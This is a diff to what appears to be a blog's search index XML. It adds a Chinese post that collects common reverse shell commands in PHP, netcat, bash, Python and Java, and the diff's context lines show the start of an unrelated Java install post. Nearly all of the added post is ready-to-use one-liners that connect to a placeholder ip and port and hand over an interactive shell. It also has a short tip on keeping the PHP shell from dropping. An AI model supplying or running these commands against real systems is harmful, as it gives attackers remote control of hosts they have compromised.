@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>常用反弹shell汇总</title>
+      <link href="2021/05/06/%E5%B8%B8%E7%94%A8%E5%8F%8D%E5%BC%B9shell%E6%B1%87%E6%80%BB/"/>
+      <url>2021/05/06/%E5%B8%B8%E7%94%A8%E5%8F%8D%E5%BC%B9shell%E6%B1%87%E6%80%BB/</url>
+      
+        <content type="html"><![CDATA[<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><p>以上这种方法可能在一定情况下存在反弹一下就断掉的情况，主要原因是：执行如上代码的话，会把系统的标准输入输出重定向到/bin/sh里，导致php-fpm直接502，然后弹的shell也会瞬间掉了，所以可以采用以下命令进行反弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock = fsockopen(&quot;ip&quot;, port);$descriptorspec = array(0 =&gt; $sock,1 =&gt; $sock,2 =&gt; $sock);$process = proc_open(&quot;/bin/sh&quot;, $descriptorspec, $pipes);proc_close($process);&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$sock</span>=fsockopen(<span class="string">&quot;ip&quot;</span>, port);exec(<span class="string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash [ip] [port]</span><br></pre></td></tr></table></figure><h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;ip&#x27;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 反弹shell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ubuntu下java卸载和安装</title>
       <link href="2021/04/22/ubuntu%E4%B8%8Bjava%E5%8D%B8%E8%BD%BD%E5%92%8C%E5%AE%89%E8%A3%85/"/>
       <url>2021/04/22/ubuntu%E4%B8%8Bjava%E5%8D%B8%E8%BD%BD%E5%92%8C%E5%AE%89%E8%A3%85/</url>
